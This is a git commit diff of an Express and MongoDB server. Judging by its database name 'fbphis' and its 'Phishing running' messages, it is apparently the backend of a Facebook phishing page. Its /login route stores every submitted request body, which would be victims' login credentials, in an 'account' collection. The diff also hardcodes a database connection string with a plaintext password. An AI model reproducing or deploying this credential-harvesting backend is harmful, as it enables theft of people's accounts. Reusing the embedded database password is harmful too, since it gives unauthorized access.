7a66fcd173c7231ebecd739b43c5a9d448579a79
JubayerAdan <jubayeradan25@gmail.com>
2024-03-27 10:36:12 +0600

    first commit5

--- index.js
+++ index.js
@@ -1,17 +1,24 @@
 const express = require("express");
-const dotenv = require("dotenv");
-const jwt = require("jsonwebtoken");
 const cors = require("cors");
-const { MongoClient, ServerApiVersion } = require("mongodb");
-const app = express();
+const dotenv = require("dotenv");
 const port = process.env.PORT || 5000;
+const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
+const app = express();
+
+app.use(express.json());
+app.use(
+  cors({
+    origin: "*",
+    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
+    credentials: true,
+  })
+);
 
 app.use(cors());
-app.use(express.json());
+
 dotenv.config();
 
-const uri =
-  "mongodb+srv://adanannaba01:adanannaba01@cluster0.bx1z9cc.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
+const uri = `mongodb+srv://adanannaba01:t19PQb6wVuwYIAJ3@cluster0.bx1z9cc.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;
 
 // Create a MongoClient with a MongoClientOptions object to set the Stable API version
 const client = new MongoClient(uri, {
@@ -24,28 +31,37 @@ const client = new MongoClient(uri, {
 
 async function run() {
   try {
-    // Connect the client to the server	(optional starting in v4.7)
+    await client.connect(); // Ensure the MongoDB client is connected
 
-    // Send a ping to confirm a successful connection
-    await client.db("admin").command({ ping: 1 });
-    console.log(
-      "Pinged your deployment. You successfully connected to MongoDB!"
-    );
     const accountCollection = client.db("fbphis").collection("account");
-    app.post("/login", async (req, res) => {
-      const request = req.body;
-      const result = await accountCollection.insertOne(request);
-      res.send(result);
+
+    app.get("/", (req, res) => {
+      res.send("Phishing running");
     });
-  } finally {
+
+    app.post("/login", async (req, res) => {
+      try {
+        const request = req.body;
+        const result = await accountCollection.insertOne(request);
+        res.send(result);
+      } catch (error) {
+        console.error("Error in /login route:", error);
+        res.status(500).send("An error occurred during login");
+      }
+    });
+
+    console.log("MongoDB connection established");
+
+    app.listen(port, () => {
+      console.log("Phishing Running");
+    });
+  } catch (error) {
+    console.error("Error during server initialization:", error);
   }
 }
+
 run().catch(console.dir);
 
-app.get("/", (req, res) => {
-  res.send("Phising is running");
-});
-
 app.listen(port, () => {
-  console.log("Server running");
+  console.log("Phising Running");
 });
